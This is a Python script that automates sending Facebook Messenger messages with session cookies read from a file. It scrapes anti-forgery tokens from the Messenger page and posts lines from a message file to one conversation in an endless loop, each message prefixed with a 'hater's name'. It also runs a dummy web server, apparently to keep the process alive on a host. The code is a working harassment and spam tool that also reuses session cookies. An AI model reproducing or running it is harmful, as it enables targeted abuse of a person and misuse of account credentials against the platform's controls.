import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import random
import re

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Server is Running")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def get_fb_cookies():
    try:
        with open('cookies.txt', 'r') as file:
            cookies_content = file.read()
        
        # Extract required cookies
        c_user = re.search(r'c_user=(\d+)', cookies_content)
        xs = re.search(r'xs=([^;]+)', cookies_content)
        fr = re.search(r'fr=([^;]+)', cookies_content)
        datr = re.search(r'datr=([^;]+)', cookies_content)
        
        if not c_user or not xs:
            print("[-] Required cookies (c_user and xs) not found!")
            return None
            
        cookies = {
            'c_user': c_user.group(1),
            'xs': xs.group(1),
            'fr': fr.group(1) if fr else '',
            'datr': datr.group(1) if datr else ''
        }
        return cookies
        
    except Exception as e:
        print(f"[-] Error reading cookies: {e}")
        return None

def send_message_with_cookies(cookies, convo_id, message):
    headers = {
        'authority': 'www.facebook.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'referer': f'https://www.facebook.com/messages/t/{convo_id}',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }
    
    # First get fb_dtsg token
    session = requests.Session()
    for name, value in cookies.items():
        if value:  # Only add cookie if it has a value
            session.cookies.set(name, value)
    
    try:
        # Load messenger page to get required tokens
        res = session.get(f'https://www.facebook.com/messages/t/{convo_id}', headers=headers)
        fb_dtsg = re.search(r'"token":"(.*?)"', res.text)
        jazoest = re.search(r'&jazoest=(\d+)', res.text)
        
        if not fb_dtsg or not jazoest:
            print("[-] Could not extract required tokens from page")
            return False
            
        # Prepare form data
        form_data = {
            'fb_dtsg': fb_dtsg.group(1),
            'jazoest': jazoest.group(1),
            'body': message,
            'send': 'Send',
            'tids': f'cid.{convo_id}',
            'wwwupp': 'C3',
            'platform': 'web',
            'source': 'messages_web_basic',
            '__user': cookies['c_user']
        }
        
        # Send message
        response = session.post('https://www.facebook.com/messages/send/', data=form_data, headers=headers)
        return response.ok
        
    except Exception as e:
        print(f"[!] Error sending message: {e}")
        return False

def send_messages():
    # Get cookies from file
    cookies = get_fb_cookies()
    if not cookies:
        sys.exit()
    
    # Read conversation ID
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()
    except:
        print("[-] Error reading convo.txt")
        sys.exit()
    
    # Read messages file
    try:
        with open('file.txt', 'r') as file:
            text_file_path = file.read().strip()
        with open(text_file_path, 'r') as file:
            messages = [line.strip() for line in file.readlines() if line.strip()]
    except:
        print("[-] Error reading messages file")
        sys.exit()
    
    # Read hater's name
    try:
        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()
    except:
        haters_name = ""
    
    # Read delay time
    try:
        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())
    except:
        speed = 5
    
    print("[+] Starting message sending...")
    
    while True:
        try:
            for i, message in enumerate(messages):
                full_message = f"{haters_name} {message}" if haters_name else message
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                
                if send_message_with_cookies(cookies, convo_id, full_message):
                    print(f"[+] Message {i+1} sent successfully | {current_time}")
                else:
                    print(f"[-] Failed to send message {i+1} | {current_time}")
                
                time.sleep(speed)
            
            print("[+] All messages sent. Restarting...")
            
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(30)  # Wait before retrying

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.daemon = True
    server_thread.start()
    
    send_messages()

if __name__ == '__main__':
    main()
